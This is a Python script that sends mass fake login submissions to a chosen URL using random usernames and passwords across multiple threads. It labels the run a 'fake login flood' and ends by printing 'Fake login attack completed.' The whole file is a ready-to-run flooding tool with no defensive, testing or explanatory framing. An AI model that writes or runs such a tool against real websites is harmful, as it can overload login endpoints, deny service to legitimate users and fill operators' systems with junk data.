import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor

def generate_fake_credential():
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
    return username, password

def send_fake_login(url, username_field, password_field, delay_between):
    username, password = generate_fake_credential()
    data = {
        username_field: username,
        password_field: password
    }
    try:
        response = requests.post(url, data=data, timeout=5)
        status = response.status_code
        print(f"[+] Sent fake login: {username}:{password} → Status {status}")
    except Exception as e:
        print(f"[!] Error: {e}")
    time.sleep(delay_between)

def start_flood(url, username_field="username", password_field="password", num_submissions=100, threads=10, delay_between=0.1):
    print(f"[*] Starting fake login flood to: {url}")
    print(f"[*] Sending {num_submissions} fake logins using {threads} threads...\n")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(num_submissions):
            executor.submit(send_fake_login, url, username_field, password_field, delay_between)
    print("[✓] Fake login attack completed.")

def run_mass_fake_login(url, username_field="username", password_field="password", num_submissions=100, threads=10, delay_between=0.1):
    start_flood(url, username_field, password_field, num_submissions, threads, delay_between)